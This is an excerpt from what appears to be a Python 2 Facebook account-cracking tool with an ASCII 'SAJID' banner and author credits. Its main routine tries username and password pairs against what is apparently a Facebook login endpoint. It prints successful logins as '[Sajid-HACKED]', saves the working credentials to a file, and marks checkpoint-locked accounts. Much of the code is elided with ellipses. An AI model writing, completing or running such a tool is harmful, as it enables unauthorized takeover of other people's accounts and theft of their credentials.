...
print("""
 ...
 \033[0;94m        ____    _       _ ___ ____  
 \033[0;96m      / ___|  / \     | |_ _|  _ \ 
 \033[0;96m      \___ \ / _ \ _  | || || | | |
 \033[0;96m          ___) / ___ \ |_| || || |_| |
 \033[0;96m      |____/_/   \_\___/|___|____/                              
""")
print("\033[0;91mThis Tool's Free By Sajid Hossain ")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : Sajid Hossain '
    print '\033[0;94mFACEBOOK : Mohammad Sajid '
    print '\033[0;96mGITHUB   : Sajidgithub'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Sajid-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[Sajid-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
